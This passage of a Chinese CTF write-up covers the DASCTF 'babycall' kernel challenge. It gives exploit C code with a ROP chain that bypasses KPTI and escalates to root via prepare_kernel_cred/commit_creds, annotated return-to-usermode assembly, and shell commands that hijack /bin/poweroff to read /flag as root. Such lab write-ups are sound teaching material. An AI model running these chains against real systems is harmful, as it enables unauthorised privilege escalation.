+<p>故可以利用此处这段gadget来控制CR3寄存器从而切换到用户态,也可以利用<code>swapgs_restore_regs_and_return_to_usermode</code>函数来进行修改CR3的值实现态的切换</p>
+<h3 id="利用">利用</h3>
+<h4 id="1bypass-kpti-and-rop">1.Bypass KPTI and ROP</h4>
+<p>因为可以控制BSS数据,所以第一次修改vuln函数指针,因为没有开启smap保护,配合<code>xchg esp, ecx</code>将内核栈迁移到<code>用户态的数据段上</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C">	<span class="n">save_status</span><span class="p">();</span>
+	<span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/dev/babycall&#34;</span><span class="p">,</span><span class="n">O_RDONLY</span><span class="p">);</span>
+	<span class="n">size_t</span> <span class="n">key</span><span class="p">[</span><span class="mi">8</span><span class="p">],</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="n">memset</span><span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">key</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x20</span><span class="p">);</span>
+	<span class="n">memset</span><span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">ROP</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
+	
+	<span class="n">key</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0F0E0E0B0D0A0E0D</span><span class="p">;</span>
+	<span class="n">key</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xFFFFFFFF81943495</span><span class="p">;</span> <span class="c1">// xchg esp, ecx; add eax, 0x5D010000; ret;
+</span><span class="c1"></span>
+	<span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x10001</span><span class="p">,</span><span class="o">&amp;</span><span class="n">key</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>第二次调用,则会传入ROP,ROP此处是位于利用程序的BSS段上,因为没有开启<code>SMAP</code>保护,所以可以由内核栈迁移到用户态,首先利用<code>prepare_kernel_cred</code>和<code>commit_creds</code>提权,由于我没找到适合的<code>mov rdi, rax</code>的gadget,所以中间用了两个gadget组合来控制标志寄存器中zero flag位,然后绕过了<code>jne 0x32A6FC</code>提权后则利用<code>swapgs_restore_regs_and_return_to_usermode</code>从内核态切换到用户态,汇编如下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="nf">pop</span>    <span class="no">r15</span>
+<span class="nf">pop</span>    <span class="no">r14</span>
+<span class="nf">pop</span>    <span class="no">r13</span>
+<span class="nf">pop</span>    <span class="no">r12</span>
+<span class="nf">pop</span>    <span class="no">rbp</span>
+<span class="nf">pop</span>    <span class="no">rbx</span>
+<span class="nf">pop</span>    <span class="no">r11</span>
+<span class="nf">pop</span>    <span class="no">r10</span>
+<span class="nf">pop</span>    <span class="no">r9</span>
+<span class="nf">pop</span>    <span class="no">r8</span>
+<span class="nf">pop</span>    <span class="no">rax</span>
+<span class="nf">pop</span>    <span class="no">rcx</span>
+<span class="nf">pop</span>    <span class="no">rdx</span>
+<span class="nf">pop</span>    <span class="no">rsi</span>
+<span class="nf">mov</span>    <span class="no">rdi</span><span class="p">,</span><span class="no">rsp</span>
+<span class="nf">mov</span>    <span class="no">rsp</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="no">gs</span><span class="p">:</span><span class="mi">0x5004</span>
+<span class="nf">push</span>   <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rdi</span><span class="err">+</span><span class="mi">0x30</span><span class="p">]</span>
+<span class="nf">push</span>   <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rdi</span><span class="err">+</span><span class="mi">0x28</span><span class="p">]</span>
+<span class="nf">push</span>   <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rdi</span><span class="err">+</span><span class="mi">0x20</span><span class="p">]</span>
+<span class="nf">push</span>   <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rdi</span><span class="err">+</span><span class="mi">0x18</span><span class="p">]</span>
+<span class="nf">push</span>   <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rdi</span><span class="err">+</span><span class="mi">0x10</span><span class="p">]</span>
+<span class="nf">push</span>   <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rdi</span><span class="p">]</span>
+<span class="nf">push</span>   <span class="no">rax</span>
+<span class="nf">xchg</span>   <span class="no">ax</span><span class="p">,</span><span class="no">ax</span>
+<span class="nf">mov</span>    <span class="no">rdi</span><span class="p">,</span><span class="no">cr3</span>
+<span class="nf">jmp</span>    <span class="mi">0xFFFFFFFF81C00AA3</span>
+<span class="err">↓</span>
+
+<span class="nf">or</span>     <span class="no">rdi</span><span class="p">,</span> <span class="mi">0x1000</span>
+<span class="nf">mov</span>    <span class="no">cr3</span><span class="p">,</span> <span class="no">rdi</span>
+<span class="nf">pop</span>    <span class="no">rax</span>
+<span class="nf">pop</span>    <span class="no">rdi</span>
+<span class="nf">swapgs</span> 
+<span class="no">nop</span>    <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rax</span><span class="p">]</span>
+<span class="nf">jmp</span>    <span class="mi">0xFFFFFFFF81C00AE0</span>
+<span class="err">↓</span>
+
+<span class="nf">test</span>   <span class="no">byte</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rsp</span> <span class="err">+</span> <span class="mi">0x20</span><span class="p">],</span> <span class="mi">4</span>
+<span class="nf">jne</span>    <span class="mi">0xFFFFFFFF81C00AE9</span>
+<span class="err">↓</span>
+
+<span class="nf">iretq</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>最后<code>iretq</code>的条件在之前由<code>RDI</code>控制并压入栈中即可</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C">	<span class="n">ROP</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xFFFFFFFF81026CAD</span><span class="p">;</span> <span class="c1">//pop rdi; ret
+</span><span class="c1"></span>	<span class="n">ROP</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="n">ROP</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">prepare_kernel_cred</span><span class="p">;</span>
+	<span class="n">ROP</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xFFFFFFFF8131422E</span><span class="p">;</span> <span class="c1">// pop rsi; ret;
+</span><span class="c1"></span>	<span class="n">ROP</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="n">ROP</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xFFFFFFFF812A451A</span><span class="p">;</span> <span class="c1">//test rsi, rsi; jne 0x4a4520; ret;
+</span><span class="c1"></span>	<span class="n">ROP</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xFFFFFFFF8112A71A</span><span class="p">;</span> <span class="c1">//mov rdi, rax; jne 0x32A6FC; pop rbp; ret;
+</span><span class="c1"></span>	<span class="n">ROP</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="n">ROP</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">commit_creds</span><span class="p">;</span>
+	<span class="n">ROP</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">swapgs_restore_regs_and_return_to_usermode</span><span class="p">;</span>
+	<span class="n">i</span> <span class="o">=</span> <span class="mi">24</span><span class="p">;</span>
+	<span class="n">ROP</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="n">ROP</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="n">ROP</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">get_shell</span><span class="p">;</span>
+	<span class="n">ROP</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_cs</span><span class="p">;</span>
+	<span class="n">ROP</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rflags</span><span class="p">;</span>
+	<span class="n">ROP</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_sp</span><span class="p">;</span>
+	<span class="n">ROP</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_ss</span><span class="p">;</span>
+	<span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x10001</span><span class="p">,</span><span class="o">&amp;</span><span class="n">ROP</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+	<span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="2根目录权限控制不严的非预期">2.根目录权限控制不严的非预期</h4>
+<p>因为文件系统给了根目录的root权限,所以</p>
+<pre><code>chmod 777 . ..
+mv bin BIN
+/BIN/mkdir bin
+/BIN/chmod 777 bin
+/BIN/echo &quot;/BIN/cat /flag&quot; &gt; /bin/poweroff
+/BIN/chmod 777 /bin/poweroff
+exit
+</code></pre><p>因此可以通过修改/bin/目录下的文件,让文件系统里面init启动文件结束的时候以<code>root</code>权限将文件读取出来</p>
+<h4 id="知识点">知识点</h4>
+<ol>
+<li>开启KPTI保护后,由内核态切换到用户态,涉及到CR3寄存器的修改,可以由<code>swapgs_restore_regs_and_return_to_usermode</code>函数修改CR3并返回到用户态</li>
+<li>在未开启SMAP保护的时候,可以将内核栈的空间迁移到用户态中,若布置ROP在用户态,ROP链构造可以更加灵活</li>
+</ol>
+<h4 id="后记">后记</h4>
+<p>对于SYSCALL调用还有点模糊,稍后补一补</p>
+<h4 id="reference">&ldquo;Reference&rdquo;</h4>
+<p><a href="https://bbs.pediy.com/thread-258975.htm">[KERNEL PWN状态切换原理及KPTI绕过]</a><br>
+<a href="https://blog.csdn.net/juS3Ve/article/details/79544927">[KPTI补丁分析]</a><br>
+<a href="https://zhuanlan.zhihu.com/p/79236207?from_voters_page=true">[Linux系统调用过程分析]</a><br>
+<a href="../attachment/DASCTF_babycall.zip">[附件]</a></p>
+
+    </div>
+</div>
+
+<div class="container">
+    
+    <nav class="flex container suggested">
+        
+        <a rel="prev" href="/articles/starctf2019_hackme/" title="Previous post (older)">
+            <span>Previous</span>
+            StarCTF2019_Hackme
+            </a>
+        
+        
+        
+        <a rel="next" href="/articles/cve-2021-3156%E5%8F%8Acve-2019-18634%E5%88%86%E6%9E%90/" title="Next post (newer)">
+            <span>Next</span>
+            以两个Sudo指令缓冲区溢出CVE进行分析
+            </a> 
+        
+    </nav>
+    
+</div>
+</main>
+
+
+        </main>
+        <footer class="footer flex">
+    <section class="container">
+        <nav class="footer-links">
+            
+            <a href="/index.xml">RSS</a>
+            
+        </nav>
+    </section>
+    
+    <script async src="/js/features.min.a94f58a30ad2560de728e080d87f75c60cf806fd1b3d5f4815f1a1a02c0d1859.js"></script>
+</footer>
+    </body>
+</html>
